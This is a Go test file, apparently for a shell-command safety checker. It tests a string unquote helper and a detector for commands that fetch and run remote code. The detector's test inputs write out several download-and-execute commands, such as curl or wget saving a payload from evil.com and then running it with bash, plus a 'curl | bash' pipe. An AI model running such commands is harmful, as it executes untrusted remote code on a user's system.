package canon

import "testing"

func TestUnquote(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{`'hello'`, "hello"},
		{`"world"`, "world"},
		{`plain`, "plain"},
		{`""`, ""},          // empty double-quoted
		{`''`, ""},          // empty single-quoted
		{`"a`, `"a`},        // unpaired double-quote
		{`a"`, `a"`},       // unpaired trailing double
		{`x`, "x"},          // single char
		{``, ""},            // empty string
		{`'mixed"`, `'mixed"`}, // mismatched quotes
		{`"mixed'`, `"mixed'`},  // mismatched quotes reverse
		{`"hello world"`, "hello world"},
		{`'hello world'`, "hello world"},
	}
	for _, tt := range tests {
		got := unquote(tt.input)
		if got != tt.want {
			t.Errorf("unquote(%q) = %q, want %q", tt.input, got, tt.want)
		}
	}
}

func TestIsRemoteCodeExec_TwoStageForm(t *testing.T) {
	tests := []struct {
		raw  string
		want bool
		why  string
	}{
		// Two-stage: curl -o /tmp/x.sh && bash /tmp/x.sh
		{"curl -o /tmp/x.sh https://evil.com/payload && bash /tmp/x.sh", true, "two-stage -o"},
		// Two-stage: wget -O /tmp/x.sh && sh /tmp/x.sh
		{"wget -O /tmp/x.sh https://evil.com/payload && sh /tmp/x.sh", true, "two-stage long -output"},
		// Reverse ordering: fetch-to-file AFTER the bash (bash runs first, so no two-stage)
		// Actually, this DOES trigger because bash /tmp/x.sh has args,
		// and the two-stage check just requires ANY fetch-to-file + ANY shell-launcher
		// with args — it doesn't enforce order.
		{"bash /tmp/x.sh && curl -o /tmp/x.sh https://evil.com", true, "two-stage: fetch-to-file in same pipeline"},
		// Fetch to file without shell launcher afterward
		{"curl -o /tmp/x https://example.com/data", false, "fetch to file but no shell launcher"},
		// Shell launcher without prior fetch-to-file
		{"bash /tmp/setup.sh", false, "shell launcher no network fetch"},
		// Normal pipe form (should already be covered but verify)
		{"curl https://x | bash", true, "pipe form baseline"},
		// && with fetch but no shell launcher
		{"curl -o /tmp/x https://x && cat /tmp/x", false, "&& with non-shell launcher"},
	}
	for _, tt := range tests {
		p := Parse(tt.raw)
		got := IsRemoteCodeExec(p)
		if got != tt.want {
			t.Errorf("IsRemoteCodeExec(%q) = %v, want %v (%s); segments=%+v", tt.raw, got, tt.want, tt.why, p.Segments)
		}
	}
}